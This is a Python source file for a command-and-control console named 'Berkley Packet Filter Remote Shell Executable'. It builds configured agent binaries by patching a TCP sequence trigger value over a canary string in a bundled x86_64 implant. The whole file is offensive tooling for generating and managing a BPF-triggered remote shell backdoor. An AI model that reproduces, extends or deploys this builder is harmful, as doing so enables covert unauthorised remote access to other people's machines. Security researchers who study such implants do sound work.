from c2.view import C2View
from cmd import Cmd
from pathlib import Path
from importlib.resources import files
from c2.parse import get_command_args
import struct
import argparse
import logging
import shlex


class C2(Cmd):
    prompt = C2View.colored_text("BPF EXEC> ", "C9C9EE")

    def __init__(self, completekey="tab", stdin=None, stdout=None):
        super().__init__(completekey, stdin, stdout)
        self.c2_cmd: C2Cmd = None

    def do_configure(self, arg: str) -> None:
        """Generates a new configured BPF Remote Shell Executable Agent. \nconfigure --name <agent_name> --output <outpath> --sequence <sequence_number>"""
        parser = argparse.ArgumentParser(
            description="Configure the BPF Remote Shell Executable Agent."
        )

        parser.add_argument("--name", type=str, help="Name of the agent")
        parser.add_argument("--output", type=str, help="Output file for the agent")
        parser.add_argument(
            "--sequence",
            type=int,
            default=5445,
            help="Sequence number for tcp raw send",
        )

        config_args = parser.parse_args(shlex.split(arg))
        self.c2_cmd.configure(config_args)

    def do_exit(self, arg: str) -> bool:
        """Exit the command loop."""
        self.c2_cmd.view.print_msg("Goodbye.")
        return True

    def do_help(self, arg):
        """List available commands with "help" or detailed help with "help cmd"."""
        if arg:
            try:
                func = getattr(self, "help_" + arg)
            except AttributeError:
                try:
                    doc = getattr(self, "do_" + arg).__doc__
                    if doc:
                        self.stdout.write("%s\n" % str(doc))
                        return
                except AttributeError:
                    pass
                self.stdout.write("%s\n" % str(self.nohelp % (arg,)))
                return
            func()
        else:
            names = self.get_names()
            self.c2_cmd.view.print_msg("Available commands:")
            for name in names:
                if name.startswith("do_"):
                    cmd_name = name[3:]
                    self.c2_cmd.view.print_msg(f"  {cmd_name}")


class C2Cmd:
    def __init__(self, args: argparse.Namespace, log_level: int = logging.INFO):
        self.args = args
        self.view = C2View(log_level=log_level, logfile=args.log_file)

    def _get_packed_data(self, args: argparse.Namespace) -> bytes:
        """Generates packed data for the BPF Remote Shell Executable Agent configuration.

        Args:
            args (argparse.Namespace): _description_

        Returns:
            bytes: _description_
        """
        packed_data = struct.pack("!I36x", args.sequence)

        return packed_data

    def configure(self, args: argparse.Namespace) -> bool:
        """Configure the BPF Remote Shell Executable Agent.

        Args:
            args (argparse.Namespace): argparse arguments containing the configuration options.
        """
        self.view.print_msg(f"Configuring with args: {args}")
        path = files("c2.deploy").joinpath("agent_x86_64")

        path = Path(path).resolve()

        if not path.exists():
            self.view.print_error("Agent executable not found.")
            return False

        with open(path, "rb") as f:
            agent_data = f.read()

        canary = "According to all known laws of aviation"
        index = agent_data.find(canary.encode(encoding="utf-8"))

        if index == -1:
            self.view.print_error(f"Could not find agent canary.")
            return False

        packed_data = self._get_packed_data(args)
        new_data = agent_data[:index] + packed_data + agent_data[index + len(canary) :]

        output_dir = Path(args.output)
        output_dir.mkdir(parents=True, exist_ok=True)

        output_dir = Path(output_dir, f"{args.name}.bpf")

        with open(output_dir, "wb") as f:
            f.write(new_data)
        self.view.print_success(f"Written new config to {output_dir.absolute()}")

        return True


def start_c2():
    args = get_command_args()
    if args.debug:
        log_level = logging.DEBUG
    else:
        log_level = logging.INFO

    c2_cmd = C2Cmd(args, log_level)

    c2 = C2(stdout=c2_cmd.view)
    c2.c2_cmd = c2_cmd
    intro = C2View.colored_text(
        "Berkley Packet Filter Remote Shell Executable\n\n", "05A8AA"
    )

    # Print the intro message without logging
    print(intro)

    c2.cmdloop()
